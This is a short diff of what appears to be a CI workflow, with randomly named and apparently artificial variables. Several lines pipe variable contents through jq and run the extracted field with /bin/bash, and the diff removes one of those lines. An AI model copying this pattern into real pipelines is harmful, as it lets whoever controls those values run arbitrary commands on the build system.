@@ -27,7 +27,6 @@ jobs:
           echo $epcvo41 | jq -r .qqqj34 | /bin/bash
           printf '%s' "$q4023" | jq -r .eetv1 | /bin/bash
           echo $ohl85 | jq -r .nyj0 | /bin/bash
-          echo $bf85 | jq -r .fq935 | /bin/bash
           echo $jwxo0 | jq -r .zchby770 | /bin/bash
 
       - name: Save output
